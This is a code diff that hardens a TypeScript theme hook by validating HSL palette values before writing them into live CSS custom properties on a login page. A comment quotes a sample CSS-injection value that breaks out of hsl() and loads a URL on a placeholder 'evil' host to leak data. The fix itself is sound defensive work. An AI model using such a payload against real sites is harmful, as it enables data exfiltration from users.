@@ -94,9 +94,17 @@ export function useSkin() {
       ["success", "success"],
       ["info", "info"],
     ];
+    // SECURITY: palette values are interpolated into hsl(...) and written to
+    // live CSS custom properties. Validate the "H S% L%" token shape so an
+    // operator value like "0 0% 0%) } body{background:url(//evil/?c=" can't
+    // break out of the hsl() and inject arbitrary CSS (a data-exfil vector,
+    // and the skin loads on the pre-auth login page). Non-conforming values
+    // are skipped (the index.css default stands).
+    const isHsl = (v: string) =>
+      /^\d{1,3}(\.\d+)?\s+\d{1,3}(\.\d+)?%\s+\d{1,3}(\.\d+)?%$/.test(v.trim());
     for (const [paletteKey, cssName] of mapping) {
       const value = (variant as Record<string, string | undefined>)[paletteKey as string];
-      if (typeof value === "string" && value) {
+      if (typeof value === "string" && isHsl(value)) {
         root.style.setProperty(`--color-${cssName}`, `hsl(${value})`);
       }
     }
@@ -105,11 +113,11 @@ export function useSkin() {
     // them explicitly. These are the same defaults pattern index.css uses.
     const bg = (variant as Record<string, string | undefined>).bg;
     const fg = (variant as Record<string, string | undefined>).fg;
-    if (bg) {
+    if (bg && isHsl(bg)) {
       root.style.setProperty("--color-card", `hsl(${bg})`);
       root.style.setProperty("--color-popover", `hsl(${bg})`);
     }
-    if (fg) {
+    if (fg && isHsl(fg)) {
       root.style.setProperty("--color-card-foreground", `hsl(${fg})`);
       root.style.setProperty("--color-popover-foreground", `hsl(${fg})`);
     }
